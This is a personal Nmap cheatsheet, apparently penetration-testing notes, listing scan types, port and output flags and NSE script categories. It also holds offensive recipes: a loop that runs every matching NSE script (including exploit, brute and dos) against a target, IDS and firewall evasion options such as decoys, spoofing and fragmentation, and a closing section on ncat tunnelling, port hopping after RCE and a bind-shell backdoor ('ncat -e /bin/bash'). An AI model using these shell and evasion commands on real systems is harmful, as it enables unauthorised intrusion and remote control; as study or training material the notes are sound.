# Nmap Cheatsheet
Check [[nmapAllTheScripts]] for NSE scripts

## Utility
```bash
-v  # verbosity level 1
-vv # verboseity level 2
-V  # version
-h	# help
-e $interface	# specify interface
```
## Target Syntax
```c
10.10.10.10	# single ip
10.10.10.10 11.11.11.11 # multiple ip
10.10.10.10,11  # octet list
10.10.10.10-225	# octet range
10.10.10.0/24	# entire subnet
```
Addition host specifying flags
```bash
nmap -iR $int	# random hosts
--exclude $target
--excludefile hosts.txt
-sL 			# creates host list listing each host of the network
-6				# IPv6 target(s)
```

# Scans 
```bash
nmap -sn				# Host discovery(NO PORT SCAN)
nmap -sS $IP 			# TCP SYN Scan    		
nmap -sT $IP 			# TCP Connect Scan        	
nmap -sU $IP 			# UDP Scan        		
nmap -sN $IP 			# TCP NULL Scan   		
nmap -sF $IP 			# TCP FIN Scan    		
nmap -sX $IP 			# Xmas Scan       		
nmap -sA $IP  			# TCP ACK Scan    		
nmap –scanflags [flags] $IP 	# Custom TCP Scan 		
nmap -sO $IP  			# IP Protocol Scan        	
nmap –send-eth $IP 		# Send Raw Ethernet Packets      
nmap –send-ip $IP 		# Send IP Packets
nmap -Pn 				# Non-Ping Scan
# If host drops ICMP packetsi(NO PING), skips host discovery
nmap -sP				# Ping Scan only
nmap -PS				# TCP SYN Ping Scan
nmap -PA				# TCP ACK Ping Scan
nmap -PU 				# UDP Ping Scan
nmap -PY				# SCTP INIT Ping 
nmap -PE				# ICMP ECho Ping Scan
nmap -PP				# ICMP Ping Scan
nmap -PM				# ICMP Address mask Ping Scan
nmap -PO 				# IP protocol ping
nmap -PR				# Arp Ping
```
## Packet Size
```bash
Default -sS sizeof 44 [20=ip_header,24=TCP_header] 
```
## Diagnostics and DNS
```bash
--traceroute	# Track packets with traceroute
-R				# Force Reverse DNS Resolution
-n 				# Disable Reverse DNS Resolution
-system-dns		# Alternative DNS Lookup
-dns-servers	# Manually Specify DNS Server(s)
-d  # debugging
--reason # display nmap's port state reason
--open 	# openness of ports put here as well as in ports section
--packet-trace  # trace packets
--iflist	# Display host networking 
```
## Analysis with tshark and iptables
[[Tshark-Cheatsheet]]: 
```bash
ifconfig | grep -C 2 $IP-MINUS-4TH-OCTET	# cp interface
$INTERFACE #=cp interface
tshark -i $INTERFACE
```

Iptables
```bash
iptables -I INPUT -s $IP -j ACCEPT
iptables -I OUTPUT -d $IP -j ACCEPT
iptables -Z # zero packet data
iptables -nv -L # scan tables
```

## Listeners and Client connections:
```bash
ncat -lvnp $PORT
ncat -u $IP $PORT # Connect to ncat udp listener
ncat -ulvnp $PORT # UDP listener
```
## Port
By default Nmap does not scan the ports in numerical order
```bash
-p #1,2 			# port listing
-p #0-65355			# port range
-p #servicename		# service name
-p ‘*’ 				# all ports
-p U:$ports T:$port	# by protocol
-p-					# all ports 
--open				# open
-top-ports			# top 100 ports
-F 					# Fast scan 
-r 					# Perform a Sequential Port Scan
```

## Version Detection
```bash
-O		# OS scanning
–osscan-guess # Guess Unknown OS
-A 		# Aggressive Scan also performs -sC -sV
```

## Scripts
```bash
-sC		#default scripts
-sV		#Version Detection
-sV –version-trace # Troubleshoot versions
-sR 	#Perform a RPC Scan


--script
--script auth
--script broadcast
--script brute
--script default
--script discovery
--script dos
--script exploit
--script external
--script fuzzer
--script intrusive
--script malware
--script safe
--script version
--script vuln

```
## Nmap ScriptGun 
```bash
dir=$(locate /nmap/scripts)
type=$1
for script in $(ls $dir | grep $type); do
	echo $script
	nmap --script $script $IP
	wait
done
exit
```

## Input
```bash
nmap -sn $IP | tee hostDiscoveryScan.txt
grep 'scan report' hostDiscoveryScan.txt | rev | cut -d " " -f1 | cut -d ")" -f2 | rev | cut -d "(" -f2 | tee IPList.txt
nmap -iL IPList.txt
```

## Outputing data
```bash
-oN		# output txt
-oX		# output xml
-oS		# output in leet
-oG		# output greppable
-oA		# output ALL
```

##  Scanflags for custom TCP flags
```bash
--scanflags lets you choose which flags you want to set.

URG # Urgent
ACK # Acknowledge
PSH # Push
RST # Reset
SYN # Synchronize
FIN # Finish
```


## Firewall & IDS & IPS Evasion
```bash
# Evasion Approach                              Nmap Argument
-D DECOY1_IP1,DECOY_IP2,ME # Hide a scan with decoys 
-D RND,RND,ME			   # Hide a scan with random decoys
--proxies   # Use an HTTP/SOCKS4 proxy to relay connections PROXY_URL
--spoof-mac # Spoof source MAC address                        MAC_ADDRESS
-S IP_ADDRESS # Spoof source IP address
-g PORT_NUM or --source-port PORT_NUM # Use a specific source port number               
-f	# Fragment IP data into 8 bytes
-ff # Fragment IP data into 16 bytes
--mtu VALUE # Fragment packets with given MTU
--data-length NUM # Specify packet length 
--ttl VALUE # Set IP time-to-live field 	
--ip-options OPTIONS # Send packets with specified IP options 
--badsum # Send packets with a wrong TCP/UDP checksum
-sI  # Zombie Scan
--source-port  # specify sourece port
--randomize-hosts  # random order
```

## Port Hopping
Have RCE on target AND ncat bin
Setup Listener on Attack box
```bash
ncat -lvnp $PORT
```
RCE back to listener:
```bash
ncat $IP $PORT
```
Cycle through the ports to enumerate firewall blacklisting. 
Use non blocked ports

## Port forward/tunneling/mapping
[[Port-Redirection-And-Tunneling]], but with ncat
Defined as: Fowarding packet sent to one destination port to another destination port.
Either `-c` or `--sh-exec`
Target server should be replaced with local host
the `PORT` is the destination, `LISTENER` is the tunnel port firewall whitelisted 
```bash
ncat -lvnp $LISTENER -c "ncat TARGET_SERVER $PORT"
```

## Using Backdooring with non-standard ports
Create a backdoor via specified port 
Server Backdoor:
```bash
ncat -lvnp $LISTENER -e /bin/bash
```
On attackbox:
```bash
ncat $IP $PORT
```

## Manipulate Source TCP/UDP port
```lua
(-sS | -sT | -sU) -g $PORT
```
 ncat bypass IPS/IDS with just the right connection port or protocol
```bash
ncat -u $IP $PORT
ncat -ulvnp $PORT
```
Session splicing
```bash
-f 
-ff
-mtu
```
